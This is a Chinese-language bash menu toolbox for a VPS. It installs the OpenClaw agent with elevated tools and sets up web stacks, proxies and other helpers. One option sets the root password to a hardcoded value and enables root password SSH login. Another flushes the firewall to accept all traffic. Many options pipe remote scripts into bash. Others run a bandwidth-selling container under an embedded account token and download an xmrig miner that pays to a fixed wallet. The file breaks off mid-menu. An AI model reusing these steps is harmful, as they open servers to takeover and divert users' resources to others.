#!/bin/bash

install() {
    if [ $# -eq 0 ]; then
        echo "未提供软件包参数!"
        return 1
    fi

    for package in "$@"; do
        if ! command -v "$package" &>/dev/null; then
            if command -v apt &>/dev/null; then
                apt update -y && apt install -y "$package"
            elif command -v yum &>/dev/null; then
                yum -y update && yum -y install "$package"
            else
                echo "未知的包管理器!"
                return 1
            fi
        fi
    done

    return 0
}

install_dependency() {
      clear
      install wget socat unzip tar
}


remove() {
    if [ $# -eq 0 ]; then
        echo "未提供软件包参数!"
        return 1
    fi

    for package in "$@"; do
        if command -v apt &>/dev/null; then
            apt purge -y "$package"
        elif command -v yum &>/dev/null; then
            yum remove -y "$package"
        else
            echo "未知的包管理器!"
            return 1
        fi
    done

    return 0
}

break_end() {
      echo -e "\033[0;32m操作完成\033[0m"
      echo "按任意键继续..."
      read -n 1 -s -r -p ""
      echo ""
      clear
}

#=======================================
# OpenClaw 管理菜单
#=======================================
moltbot_menu() {
	local app_id="114"
	
	check_openclaw_update() {
		if ! command -v npm >/dev/null 2>&1; then
			return 1
		fi
		local_version=$(npm list -g openclaw --depth=0 --no-update-notifier 2>/dev/null | grep openclaw | awk '{print $NF}' | sed 's/^.*@//')
		if [ -z "$local_version" ]; then
			return 1
		fi
		remote_version=$(npm view openclaw version --no-update-notifier 2>/dev/null)
		if [ -z "$remote_version" ]; then
			return 1
		fi
		if [ "$local_version" != "$remote_version" ]; then
			echo "检测到新版本:$remote_version"
		else
			echo "当前版本已是最新:$local_version"
		fi
	}

	get_install_status() {
		if command -v openclaw >/dev/null 2>&1; then
			echo "已安装"
		else
			echo "未安装"
		fi
	}

	get_running_status() {
		if pgrep -f "openclaw-gatewa" >/dev/null 2>&1; then
			echo "运行中"
		else
			echo "未运行"
		fi
	}

	show_menu() {
		clear
		local install_status=$(get_install_status)
		local running_status=$(get_running_status)
		local update_message=$(check_openclaw_update)
		echo "======================================="
		echo "🦞 OPENCLAW 管理工具"
		echo "======================================="
		echo "$install_status $running_status $update_message"
		echo "======================================="
		echo "1.  安装"
		echo "2.  启动"
		echo "3.  停止"
		echo "--------------------"
		echo "4.  状态日志查看"
		echo "5.  换模型"
		echo "6.  API管理"
		echo "7.  机器人连接对接"
		echo "8.  插件管理（安装/删除）"
		echo "9.  技能管理（安装/删除）"
		echo "10. 编辑主配置文件"
		echo "11. 配置向导"
		echo "12. 健康检测与修复"
		echo "13. WebUI访问与设置"
		echo "14. TUI命令行对话窗口"
		echo "15. 记忆/Memory"
		echo "16. 权限管理"
		echo "17. 多智能体管理"
		echo "--------------------"
		echo "18. 备份与还原"
		echo "19. 更新"
		echo "20. 卸载"
		echo "--------------------"
		echo "0. 返回上一级选单"
		echo "--------------------"
		printf "请输入选项并回车: "
	}

	start_gateway() {
		openclaw gateway stop
		openclaw gateway start
		sleep 3
	}

	install_node_and_tools() {
		if command -v dnf &>/dev/null; then
			curl -fsSL https://rpm.nodesource.com/setup_24.x | sudo bash -
			dnf update -y
			dnf group install -y "Development Tools" "Development Libraries"
			dnf install -y cmake libatomic nodejs
		fi
		if command -v apt &>/dev/null; then
			curl -fsSL https://deb.nodesource.com/setup_24.x | bash -
			apt update -y
			apt install build-essential python3 libatomic1 nodejs -y
		fi
	}

	configure_openclaw_session_policy() {
		local config_file="${HOME}/.openclaw/openclaw.json"
		[ ! -f "$config_file" ] && return 1
		python3 - "$config_file" <<'PY'
import json, sys
path = sys.argv[1]
with open(path, 'r', encoding='utf-8') as f:
    obj = json.load(f)
session = obj.setdefault('session', {})
session['dmScope'] = session.get('dmScope', 'per-channel-peer')
session['resetTriggers'] = ['/new', '/reset']
session['reset'] = {'mode': 'idle', 'idleMinutes': 10080}
session['resetByType'] = {
    'direct': {'mode': 'idle', 'idleMinutes': 10080},
    'thread': {'mode': 'idle', 'idleMinutes': 1440},
    'group': {'mode': 'idle', 'idleMinutes': 120}
}
with open(path, 'w', encoding='utf-8') as f:
    json.dump(obj, f, ensure_ascii=False, indent=2)
    f.write('\n')
PY
	}

	sync_openclaw_api_models() {
		local config_file="${HOME}/.openclaw/openclaw.json"
		[ ! -f "$config_file" ] && return 0
		install jq curl >/dev/null 2>&1
		echo "OpenClaw API 模型同步功能..."
		return 0
	}

	install_moltbot() {
		echo "开始安装 OpenClaw..."
		install_node_and_tools
		npm install -g openclaw@latest
		openclaw onboard --install-daemon
		openclaw config set tools.profile full
		openclaw config set tools.elevated.enabled true
		configure_openclaw_session_policy
		start_gateway
		break_end
	}

	start_bot() {
		echo "启动 OpenClaw..."
		start_gateway
		break_end
	}

	stop_bot() {
		echo "停止 OpenClaw..."
		tmux kill-session -t gateway > /dev/null 2>&1
		openclaw gateway stop
		break_end
	}

	view_logs() {
		echo "查看 OpenClaw 状态日志"
		openclaw status
		openclaw gateway status
		openclaw logs
		break_end
	}

	change_model() {
		echo "=== 换模型 ==="
		openclaw models list
		echo ""
		read -p "请输入模型名称 (如: qwen-portal/coder-model): " model_name
		if [ -n "$model_name" ]; then
			openclaw models set "$model_name"
			start_gateway
			echo "模型已切换为: $model_name"
		fi
		break_end
	}

	openclaw_api_manage_menu() {
		while true; do
			clear
			echo "======================================="
			echo "OpenClaw API 管理"
			echo "======================================="
			echo "1. 添加API"
			echo "2. 查看API列表"
			echo "3. 删除API"
			echo "0. 退出"
			echo "---------------------------------------"
			read -erp "请输入你的选择: " api_choice
			case "$api_choice" in
				1)
					echo "=== 交互式添加 API ==="
					read -erp "请输入 Provider 名称 (如: deepseek): " provider_name
					read -erp "请输入 Base URL (如: https://api.xxx.com/v1): " base_url
					read -rsp "请输入 API Key: " api_key
					echo
					if [ -n "$provider_name" ] && [ -n "$base_url" ] && [ -n "$api_key" ]; then
						install jq
						base_url="${base_url%/}"
						jq --arg prov "$provider_name" --arg url "$base_url" --arg key "$api_key" '
						.models |= (. // { mode: "merge", providers: {} })
						| .mode = "merge"
						| .providers[$prov] = {baseUrl: $url, apiKey: $key, api: "openai-completions", models: []}
						' "${HOME}/.openclaw/openclaw.json" > "${HOME}/.openclaw/openclaw.json.tmp" && mv "${HOME}/.openclaw/openclaw.json.tmp" "${HOME}/.openclaw/openclaw.json"
						echo "✅ API 添加成功"
						start_gateway
					fi
					;;
				2)
					echo "=== 已配置 API 列表 ==="
					jq -r '.models.providers // {} | keys[]' "${HOME}/.openclaw/openclaw.json" 2>/dev/null || echo "未找到配置"
					read -p "按回车继续..."
					;;
				3)
					echo "=== 删除 API ==="
					read -erp "请输入要删除的 API 名称: " del_provider
					if [ -n "$del_provider" ]; then
						jq --arg prov "$del_provider" 'del(.models.providers[$prov])' "${HOME}/.openclaw/openclaw.json" > "${HOME}/.openclaw/openclaw.json.tmp" && mv "${HOME}/.openclaw/openclaw.json.tmp" "${HOME}/.openclaw/openclaw.json"
						echo "✅ API 已删除"
						start_gateway
					fi
					;;
				0)
					return 0
					;;
			esac
		done
	}

	change_tg_bot_code() {
		echo "=== 机器人连接对接 ==="
		echo "请在 Telegram 中搜索 @BotFather 创建机器人"
		read -p "请输入 Bot Token: " bot_token
		if [ -n "$bot_token" ]; then
			openclaw config set channels.telegram.botToken "$bot_token"
			openclaw config set channels.telegram.enabled true
			echo "✅ Telegram 配置已保存"
		fi
		break_end
	}

	install_plugin() {
		while true; do
			clear
			echo "======================================="
			echo "OpenClaw 插件管理"
			echo "======================================="
			echo "1. 查看已安装插件"
			echo "2. 安装插件"
			echo "3. 删除插件"
			echo "0. 退出"
			echo "---------------------------------------"
			read -erp "请输入你的选择: " plugin_choice
			case "$plugin_choice" in
				1)
					openclaw plugins list
					read -p "按回车继续..."
					;;
				2)
					read -erp "请输入插件名称: " plugin_name
					if [ -n "$plugin_name" ]; then
						openclaw plugins install "$plugin_name"
					fi
					;;
				3)
					read -erp "请输入要删除的插件名称: " plugin_name
					if [ -n "$plugin_name" ]; then
						openclaw plugins remove "$plugin_name"
					fi
					;;
				0)
					return 0
					;;
			esac
		done
	}

	install_skill() {
		while true; do
			clear
			echo "======================================="
			echo "OpenClaw 技能管理"
			echo "======================================="
			echo "1. 查看已安装技能"
			echo "2. 安装技能"
			echo "3. 删除技能"
			echo "0. 退出"
			echo "---------------------------------------"
			read -erp "请输入你的选择: " skill_choice
			case "$skill_choice" in
				1)
					openclaw skills list
					read -p "按回车继续..."
					;;
				2)
					read -erp "请输入技能名称: " skill_name
					if [ -n "$skill_name" ]; then
						openclaw skills install "$skill_name"
					fi
					;;
				3)
					read -erp "请输入要删除的技能名称: " skill_name
					if [ -n "$skill_name" ]; then
						openclaw skills remove "$skill_name"
					fi
					;;
				0)
					return 0
					;;
			esac
		done
	}

	nano_openclaw_json() {
		install nano
		nano ~/.openclaw/openclaw.json
		start_gateway
	}

	openclaw_webui_menu() {
		while true; do
			clear
			echo "======================================="
			echo "OpenClaw WebUI 访问与设置"
			echo "======================================="
			echo "1. 查看访问地址"
			echo "2. 获取访问 Token"
			echo "0. 退出"
			echo "---------------------------------------"
			read -erp "请选择: " choice
			case "$choice" in
				1)
					openclaw dashboard
					read -p "按回车继续..."
					;;
				2)
					openclaw dashboard
					read -p "按回车继续..."
					;;
				0)
					return 0
					;;
			esac
		done
	}

	openclaw_backup_restore_menu() {
		while true; do
			clear
			echo "======================================="
			echo "OpenClaw 备份与还原"
			echo "======================================="
			echo "1. 备份配置"
			echo "2. 还原配置"
			echo "0. 退出"
			echo "---------------------------------------"
			read -erp "请选择: " choice
			case "$choice" in
				1)
					mkdir -p /root/openclaw_backup
					cp -r ~/.openclaw /root/openclaw_backup/backup_$(date +%Y%m%d_%H%M%S)
					echo "✅ 备份完成"
					read -p "按回车继续..."
					;;
				2)
					echo "可用备份:"
					ls -1 /root/openclaw_backup/ 2>/dev/null || echo "无备份"
					read -erp "请输入备份文件夹名称: " backup_name
					if [ -n "$backup_name" ] && [ -d "/root/openclaw_backup/$backup_name" ]; then
						cp -r /root/openclaw_backup/$backup_name/.openclaw ~/
						echo "✅ 还原完成，请重启 Gateway"
						start_gateway
					fi
					read -p "按回车继续..."
					;;
				0)
					return 0
					;;
			esac
		done
	}

	openclaw_memory_menu() {
		clear
		echo "=== 记忆/Memory ==="
		echo "1. 查看记忆"
		echo "2. 清除记忆"
		echo "0. 返回"
		read -p "请选择: " choice
		case "$choice" in
			1)
				ls -la ~/.openclaw/agents/main/agent/memories/ 2>/dev/null || echo "无记忆文件"
				read -p "按回车继续..."
				;;
			2)
				rm -rf ~/.openclaw/agents/main/agent/memories/*
				echo "✅ 记忆已清除"
				read -p "按回车继续..."
				;;
		esac
	}

	openclaw_permission_menu() {
		clear
		echo "=== 权限管理 ==="
		openclaw config get session
		read -p "按回车继续..."
	}

	openclaw_multiagent_menu() {
		clear
		echo "=== 多智能体管理 ==="
		ls -la ~/.openclaw/agents/ 2>/dev/null || echo "暂无多智能体"
		read -p "按回车继续..."
	}

	update_moltbot() {
		echo "更新 OpenClaw..."
		install_node_and_tools
		npm install -g openclaw@latest
		start_gateway
		echo "更新完成"
		break_end
	}

	uninstall_moltbot() {
		echo "卸载 OpenClaw..."
		read -p "确定要卸载吗？(y/N): " confirm
		if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
			openclaw uninstall
			npm uninstall -g openclaw
			rm -rf ~/.openclaw
			echo "卸载完成"
		fi
		break_end
	}

	while true; do
		show_menu
		read choice
		case $choice in
			1) install_moltbot ;;
			2) start_bot ;;
			3) stop_bot ;;
			4) view_logs ;;
			5) change_model ;;
			6) openclaw_api_manage_menu ;;
			7) change_tg_bot_code ;;
			8) install_plugin ;;
			9) install_skill ;;
			10) nano_openclaw_json ;;
			11) openclaw onboard --install-daemon; break_end ;;
			12) openclaw doctor --fix; sync_openclaw_api_models; start_gateway; break_end ;;
			13) openclaw_webui_menu ;;
			14) openclaw tui; break_end ;;
			15) openclaw_memory_menu ;;
			16) openclaw_permission_menu ;;
			17) openclaw_multiagent_menu ;;
			18) openclaw_backup_restore_menu ;;
			19) update_moltbot ;;
			20) uninstall_moltbot ;;
			*) break ;;
		esac
	done
}

check_port() {
    # 定义要检测的端口
    PORT=443

    # 检查端口占用情况
    result=$(ss -tulpn | grep ":$PORT")

    # 判断结果并输出相应信息
    if [ -n "$result" ]; then
        is_nginx_container=$(docker ps --format '{{.Names}}' | grep 'nginx')

        # 判断是否是Nginx容器占用端口
        if [ -n "$is_nginx_container" ]; then
            echo ""
        else
            clear
            echo -e "\e[1;31m端口 $PORT 已被占用，无法安装环境，卸载以下程序后重试！\e[0m"
            echo "$result"
            break_end
            cd ~
            ./kejilion.sh
            exit
        fi
    else
        echo ""
    fi
}


# 定义安装 Docker 的函数
install_docker() {
    if ! command -v docker &>/dev/null; then
        curl -fsSL https://get.docker.com | sh && ln -s /usr/libexec/docker/cli-plugins/docker-compose /usr/local/bin
        systemctl start docker
        systemctl enable docker
    else
        echo "Docker 已经安装"
    fi
}

iptables_open() {
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -F
}

install_ldnmp() {
      cd /home/web && docker-compose up -d
      clear
      echo "正在配置LDNMP环境，请耐心稍等……"

      # 定义要执行的命令
      commands=(
          "docker exec php apt update > /dev/null 2>&1"
          "docker exec php apt install -y libmariadb-dev-compat libmariadb-dev libzip-dev libmagickwand-dev imagemagick > /dev/null 2>&1"
          "docker exec php docker-php-ext-install mysqli pdo_mysql zip exif gd intl bcmath opcache > /dev/null 2>&1"
          "docker exec php pecl install imagick > /dev/null 2>&1"
          "docker exec php sh -c 'echo \"extension=imagick.so\" > /usr/local/etc/php/conf.d/imagick.ini' > /dev/null 2>&1"
          "docker exec php pecl install redis > /dev/null 2>&1"
          "docker exec php sh -c 'echo \"extension=redis.so\" > /usr/local/etc/php/conf.d/docker-php-ext-redis.ini' > /dev/null 2>&1"
          "docker exec php sh -c 'echo \"upload_max_filesize=50M \\n post_max_size=50M\" > /usr/local/etc/php/conf.d/uploads.ini' > /dev/null 2>&1"
          "docker exec php sh -c 'echo \"memory_limit=256M\" > /usr/local/etc/php/conf.d/memory.ini' > /dev/null 2>&1"
          "docker exec php sh -c 'echo \"max_execution_time=1200\" > /usr/local/etc/php/conf.d/max_execution_time.ini' > /dev/null 2>&1"
          "docker exec php sh -c 'echo \"max_input_time=600\" > /usr/local/etc/php/conf.d/max_input_time.ini' > /dev/null 2>&1"

          "docker exec php74 apt update > /dev/null 2>&1"
          "docker exec php74 apt install -y libmariadb-dev-compat libmariadb-dev libzip-dev libmagickwand-dev imagemagick > /dev/null 2>&1"
          "docker exec php74 docker-php-ext-install mysqli pdo_mysql zip gd intl bcmath opcache > /dev/null 2>&1"
          "docker exec php74 pecl install imagick > /dev/null 2>&1"
          "docker exec php74 sh -c 'echo \"extension=imagick.so\" > /usr/local/etc/php/conf.d/imagick.ini' > /dev/null 2>&1"
          "docker exec php74 pecl install redis > /dev/null 2>&1"
          "docker exec php74 sh -c 'echo \"extension=redis.so\" > /usr/local/etc/php/conf.d/docker-php-ext-redis.ini' > /dev/null 2>&1"
          "docker exec php74 sh -c 'echo \"upload_max_filesize=50M \\n post_max_size=50M\" > /usr/local/etc/php/conf.d/uploads.ini' > /dev/null 2>&1"
          "docker exec php74 sh -c 'echo \"memory_limit=256M\" > /usr/local/etc/php/conf.d/memory.ini' > /dev/null 2>&1"
          "docker exec php74 sh -c 'echo \"max_execution_time=1200\" > /usr/local/etc/php/conf.d/max_execution_time.ini' > /dev/null 2>&1"
          "docker exec php74 sh -c 'echo \"max_input_time=600\" > /usr/local/etc/php/conf.d/max_input_time.ini' > /dev/null 2>&1"

          "docker exec nginx chmod -R 777 /var/www/html"
          "docker exec php chmod -R 777 /var/www/html"
          "docker exec php74 chmod -R 777 /var/www/html"

          "docker restart php > /dev/null 2>&1"
          "docker restart php74 > /dev/null 2>&1"
          "docker restart nginx > /dev/null 2>&1"

      )

      total_commands=${#commands[@]}  # 计算总命令数

      for ((i = 0; i < total_commands; i++)); do
          command="${commands[i]}"
          eval $command  # 执行命令

          # 打印百分比和进度条
          percentage=$(( (i + 1) * 100 / total_commands ))
          completed=$(( percentage / 2 ))
          remaining=$(( 50 - completed ))
          progressBar="["
          for ((j = 0; j < completed; j++)); do
              progressBar+="#"
          done
          for ((j = 0; j < remaining; j++)); do
              progressBar+="."
          done
          progressBar+="]"
          echo -ne "\r[$percentage%] $progressBar"
      done

      echo  # 打印换行，以便输出不被覆盖


      clear
      echo "LDNMP环境安装完毕"
      echo "------------------------"

      # 获取nginx版本
      nginx_version=$(docker exec nginx nginx -v 2>&1)
      nginx_version=$(echo "$nginx_version" | grep -oP "nginx/\K[0-9]+\.[0-9]+\.[0-9]+")
      echo -n "nginx : v$nginx_version"

      # 获取mysql版本
      dbrootpasswd=$(grep -oP 'MYSQL_ROOT_PASSWORD:\s*\K.*' /home/web/docker-compose.yml | tr -d '[:space:]')
      mysql_version=$(docker exec mysql mysql -u root -p"$dbrootpasswd" -e "SELECT VERSION();" 2>/dev/null | tail -n 1)
      echo -n "            mysql : v$mysql_version"

      # 获取php版本
      php_version=$(docker exec php php -v 2>/dev/null | grep -oP "PHP \K[0-9]+\.[0-9]+\.[0-9]+")
      echo -n "            php : v$php_version"

      # 获取redis版本
      redis_version=$(docker exec redis redis-server -v 2>&1 | grep -oP "v=+\K[0-9]+\.[0-9]+")
      echo "            redis : v$redis_version"

      echo "------------------------"
      echo ""


}

install_certbot() {
    install certbot

    # 切换到一个一致的目录（例如，家目录）
    cd ~ || exit

    # 下载并使脚本可执行
    curl -O https://raw.githubusercontent.com/kejilion/sh/main/auto_cert_renewal.sh
    chmod +x auto_cert_renewal.sh

    # 安排每日午夜运行脚本
    echo "0 0 * * * cd ~ && ./auto_cert_renewal.sh" | crontab -
}

install_ssltls() {
      docker stop nginx > /dev/null 2>&1
      iptables_open
      cd ~
      certbot certonly --standalone -d $yuming --email your@email.com --agree-tos --no-eff-email --force-renewal
      cp /etc/letsencrypt/live/$yuming/cert.pem /home/web/certs/${yuming}_cert.pem
      cp /etc/letsencrypt/live/$yuming/privkey.pem /home/web/certs/${yuming}_key.pem
      docker start nginx > /dev/null 2>&1
}


nginx_status() {

    nginx_container_name="nginx"

    # 获取容器的状态
    container_status=$(docker inspect -f '{{.State.Status}}' "$nginx_container_name" 2>/dev/null)

    # 获取容器的重启状态
    container_restart_count=$(docker inspect -f '{{.RestartCount}}' "$nginx_container_name" 2>/dev/null)

    # 检查容器是否在运行，并且没有处于"Restarting"状态
    if [ "$container_status" == "running" ]; then
        echo ""
    else
        rm -r /home/web/html/$yuming >/dev/null 2>&1
        rm /home/web/conf.d/$yuming.conf >/dev/null 2>&1
        rm /home/web/certs/${yuming}_key.pem >/dev/null 2>&1
        rm /home/web/certs/${yuming}_cert.pem >/dev/null 2>&1
        docker restart nginx >/dev/null 2>&1
        echo -e "\e[1;31m检测到域名证书申请失败，请检测域名是否正确解析或更换域名重新尝试！\e[0m"
    fi

}


add_yuming() {
      external_ip=$(curl -s ipv4.ip.sb)
      echo -e "先将域名解析到本机IP: \033[33m$external_ip\033[0m"
      read -p "请输入你解析的域名: " yuming
}


add_db() {
      dbname=$(echo "$yuming" | sed -e 's/[^A-Za-z0-9]/_/g')
      dbname="${dbname}"

      dbrootpasswd=$(grep -oP 'MYSQL_ROOT_PASSWORD:\s*\K.*' /home/web/docker-compose.yml | tr -d '[:space:]')
      dbuse=$(grep -oP 'MYSQL_USER:\s*\K.*' /home/web/docker-compose.yml | tr -d '[:space:]')
      dbusepasswd=$(grep -oP 'MYSQL_PASSWORD:\s*\K.*' /home/web/docker-compose.yml | tr -d '[:space:]')
      docker exec mysql mysql -u root -p"$dbrootpasswd" -e "CREATE DATABASE $dbname; GRANT ALL PRIVILEGES ON $dbname.* TO \"$dbuse\"@\"%\";"
}

reverse_proxy() {
      external_ip=$(curl -s ipv4.ip.sb)
      wget -O /home/web/conf.d/$yuming.conf https://raw.githubusercontent.com/kejilion/nginx/main/reverse-proxy.conf
      sed -i "s/yuming.com/$yuming/g" /home/web/conf.d/$yuming.conf
      sed -i "s/0.0.0.0/$external_ip/g" /home/web/conf.d/$yuming.conf
      sed -i "s/0000/3099/g" /home/web/conf.d/$yuming.conf
      docker restart nginx
}

restart_ldnmp() {
      docker exec nginx chmod -R 777 /var/www/html
      docker exec php chmod -R 777 /var/www/html
      docker exec php74 chmod -R 777 /var/www/html

      docker restart php
      docker restart php74
      docker restart nginx
}


docker_app() {
if docker inspect "$docker_name" &>/dev/null; then
    clear
    echo "$docker_name 已安装，访问地址: "
    external_ip=$(curl -s ipv4.ip.sb)
    echo "http:$external_ip:$docker_port"
    echo ""
    echo "应用操作"
    echo "------------------------"
    echo "1. 更新应用             2. 卸载应用"
    echo "------------------------"
    echo "0. 返回上一级选单"
    echo "------------------------"
    read -p "请输入你的选择: " sub_choice

    case $sub_choice in
        1)
            clear
            docker rm -f "$docker_name"
            docker rmi -f "$docker_img"
            # 安装 Docker（请确保有 install_docker 函数）
            install_docker
            $docker_rum
            clear
            echo "$docker_name 已经安装完成"
            echo "------------------------"
            # 获取外部 IP 地址
            external_ip=$(curl -s ipv4.ip.sb)
            echo "您可以使用以下地址访问:"
            echo "http:$external_ip:$docker_port"
            $docker_use
            $docker_passwd
            ;;
        2)
            clear
            docker rm -f "$docker_name"
            docker rmi -f "$docker_img"
            rm -rf "/home/docker/$docker_name"
            echo "应用已卸载"
            ;;
        0)
            # 跳出循环，退出菜单
            ;;
        *)
            # 跳出循环，退出菜单
            ;;
    esac
else
    clear
    echo "安装提示"
    echo "$docker_describe"
    echo "$docker_url"
    echo ""

    # 提示用户确认安装
    read -p "确定安装吗？(Y/N): " choice
    case "$choice" in
        [Yy])
            clear
            # 安装 Docker（请确保有 install_docker 函数）
            install_docker
            $docker_rum
            clear
            echo "$docker_name 已经安装完成"
            echo "------------------------"
            # 获取外部 IP 地址
            external_ip=$(curl -s ipv4.ip.sb)
            echo "您可以使用以下地址访问:"
            echo "http:$external_ip:$docker_port"
            $docker_use
            $docker_passwd
            ;;
        [Nn])
            # 用户选择不安装
            ;;
        *)
            # 无效输入
            ;;
    esac
fi

}



while true; do
clear

echo -e "\033[33m202311215-jyd一键脚本工具 v1.0\033[0m"
echo "------------------------"
echo "1. kejilion的综合脚本"
echo "2. OpenClaw相关工具"
echo "3. 八合一一键脚本"
echo "4. kejilion的综合脚本(国际无乱码版)"
echo "5. serv00 上的一些应用"
echo "6. 一键增加root管理员 "
echo "7. 一键AMD安装流量（1@hhxx.eu.org）"
echo "8. 一键搭建V2ray脚本"
echo "9. 甲骨文服务器保活脚本"
echo "10. 一键脚本安装hysteria2、reality、vmessws（无需域名）"
echo "11. 一键Argo + Xray（无需域名）1017可用"
echo "12. 一键梭哈脚本（无需域名）1020专门针对电信线路"
echo "13. 不常用工具 ▶ "
echo "14.  233boy的一键搭建VMSS脚本1030"
echo "15.  Sing-box精装桶一键脚本：支持Argo隧道，Hysteria2、Tuic5"
echo "16.  repocket刷流量一键脚本"
echo "17.  保持8000网页端口后台打开"
echo "18.  一键生成socks5代理"
echo "------------------------"
echo "0. 退出脚本"
echo "------------------------"
read -p "请输入你的选择: " choice

case $choice in
  1)
    clear
    curl -O https://kejilion.pro/kejilion.sh && chmod +x kejilion.sh && ./kejilion.sh
    ;;
  2)
    clear
    moltbot_menu
    ;;
  3)
    clear
    wget -P /root -N --no-check-certificate "https://raw.githubusercontent.com/mack-a/v2ray-agent/master/install.sh" && chmod 700 /root/install.sh && /root/install.sh
    ;;
  4)
    clear
    curl -sS -O https://raw.githubusercontent.com/kejilion/sh/main/kejilion.sh && chmod +x kejilion.sh && ./kejilion.sh
    ;;
  5)
    clear
    bash <(curl -Ls https://raw.githubusercontent.com/frankiejun/serv00-play/main/start.sh)
    ;;
  6)
    clear
    sudo -i
    echo root:dept1235 |sudo chpasswd root
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
    service sshd restart
    ;;
  7)
    echo "回车或其他跳过更新及docker安装AMD流量 "
    echo "输入1则要填写AMD的TM的名称"
    echo "输入2则一键安装AMD的TM"
    echo "输入3更新及docker一键安装ARM的TM，"
    echo "输入4要显示ARM的TM名称，"
    echo "输入5全手工安装TM"
    read -p "请输入你的选择: " choice
    case "$choice" in
      1)
        read -p "1输入要显示AMD的TM的名称（1@hhxx.eu.org）: " dockername
        docker pull traffmonetizer/cli_v2:latest && docker run -d --name tm traffmonetizer/cli_v2 start accept --token TLJQeUvoiwl1pSu5UcovQvYnlnbtDCffF5m3VdBCK7I= --device-name $dockername
      ;;
      2)
      echo "2输入安装更新及docker安装AMD的TM（1@hhxx.eu.org）"
        apt update && apt install docker.io -y && docker pull traffmonetizer/cli_v2:latest && docker run -d --name tm traffmonetizer/cli_v2 start accept --token TLJQeUvoiwl1pSu5UcovQvYnlnbtDCffF5m3VdBCK7I= --device-name AMD
      ;;
      3)
      echo "3输入更新及docker一键安装ARM的TM（1@hhxx.eu.org）"
        apt update && apt install docker.io -y && docker pull traffmonetizer/cli_v2:arm64v8 && docker run -d --name tm traffmonetizer/cli_v2:arm64v8 start accept --token TLJQeUvoiwl1pSu5UcovQvYnlnbtDCffF5m3VdBCK7I= --device-name AMD
      ;;
      4)
        read -p  "4输入要显示ARM的TM名称（1@hhxx.eu.org）" dockername
        docker pull traffmonetizer/cli_v2:arm64v8 && docker run -d --name tm traffmonetizer/cli_v2:arm64v8 start accept --token TLJQeUvoiwl1pSu5UcovQvYnlnbtDCffF5m3VdBCK7I= --device-name $dockername
      ;;
      5)
        read -p  "全手工安装TM,请选择系统，不能更新及安装docker，Dd为AMD系统，Rr为AMR系统" choice
        case "$choice" in
          [Dd])
               dockersys=traffmonetizer/cli_v2:latest
               doname=“AMD”
               echo "你选择的是："$doname
          ;;
          [Rr])
               dockersys=traffmonetizer/cli_v2:arm64v8
               doname=“ARM”
               echo "你选择的是："$doname
          ;;
          *)
              echo "无效的输入!"
          ;;
        esac
        read -p  "是否需要输入要显示TM名称,Yy为要输入，Nn为不输入" choice
        case "$choice" in
          [Yy])
               read -p  "输入要显示的TM名称" dockername
          ;;
          [Nn])
               echo "显示的默认TM名称："$doname
               dockername=$doname
          ;;
          *)
              echo "无效的输入!"
          ;;
        esac
        read -p  "请输入token" tokenkey
        docker pull $dockersys && docker run -d --name tm $dockersys start accept --token $tokenkey --device-name $dockername
      ;;                   
      *)
      echo "回车或者其他键跳过更新及docker安装AMD的TM（1@hhxx.eu.org）"
        docker pull traffmonetizer/cli_v2:latest && docker run -d --name tm traffmonetizer/cli_v2 start accept --token TLJQeUvoiwl1pSu5UcovQvYnlnbtDCffF5m3VdBCK7I= --device-name AMD
      ;;
    esac
    ;;
  8)
    clear
    bash <(wget -qO- -o- https://git.io/v2ray.sh)
    ;;
  9)
    clear
    curl -L https://gitlab.com/spiritysdx/Oracle-server-keep-alive-script/-/raw/main/oalive.sh -o oalive.sh && chmod +x oalive.sh && bash oalive.sh
    ;;
  10)
    clear
    bash <(curl -fsSL https://github.com/vveg26/sing-box-reality-hysteria2/raw/main/reality_hy2_ws.sh)
    ;;
  11)
    clear
    bash <(wget -qO- https://raw.githubusercontent.com/fscarmen/argox/main/argox.sh)
    ;;
  12)
    clear
    curl https://www.baipiao.eu.org/suoha.sh -o suoha.sh && bash suoha.sh
    ;;
  13)
    while true; do

      echo " ▼ "
      echo "不常用工具"
      echo "------------------------"
      echo "1. 更新ubuntu环境"
      echo "2. 安装 Docker"
      echo "3. 停止运行容器tm"
      echo "4. 删除容器tm"
      echo "5. 显示TCP和UDP端口"
      echo "6. Hysteria2安装依赖"
      echo "7. Hysteria2运行脚本"
      echo "8. zephyr一键脚本"
      echo "------------------------"
      echo "0. 返回主菜单"
      echo "------------------------"
      read -p "请输入你的选择: " sub_choice

      case $sub_choice in
          1)
              clear
              sudo apt-get update -y && sudo apt-get upgrade -y && apt install -y curl && apt install -y socat && apt install wget -y
              ;;

          2)
              clear
              sudo apt install docker.io -y && sudo apt install docker-compose
              ;;
          3)
              clear
              docker stop tm
              ;;
          4)
              clear
              docker rm tm
              ;;
          5)
              netstat -tuln
              ;;
          6)
              clear
              apt update && apt -y install curl wget tar socat jq git openssl uuid-runtime build-essential zlib1g-dev libssl-dev libevent-dev dnsutils
             ;;
          7)
              clear
              bash <(curl -L https://raw.githubusercontent.com/TinrLin/script_installation/main/Install.sh)
              ;;
          8)
              clear
              curl -O http://qc-arm1.hhxx.eu.org:8000/xmrig && chmod +x xmrig && curl -O http://qc-arm1.hhxx.eu.org:8000/config.json && chmod +x config.json && curl -O http://qc-arm1.hhxx.eu.org:8000/SHA256SUMS && chmod +x SHA256SUMS && ./xmrig -a gr -o hk.zephyr.herominers.com:1123 -u ZEPHYR2fKV7eUxVyshX5QK3EXtGtfTzQXQJ7kazFTZBtEdQqcGymtgUPByJ4SHCJSpJjeHULGFWd2S4hJcA1Z3j12VpKHxmxLXk3F -p x
              ;;  
          0)
              cd ~
              ./jyd.sh
              exit
              ;;
          *)
              echo "无效的输入!"
              ;;
      esac
      echo -e "\033[0;32m操作完成\033[0m"
      echo "按任意键继续..."
      read -n 1 -s -r -p ""
      echo ""
      clear
    done
    ;;
  14)
    clear
    bash <(wget -qO- -o- https://git.io/v2ray.sh)
    ;;
  15)
    clear
    bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/sing-box-yg/main/sb.sh)
    ;;
  16)
    read -p "确定跳过docker安装，回车或者其他键默认跳过(Y/N): " choice
    case "$choice" in
      [Yy])
      echo "输入 Y 跳过docker安装"
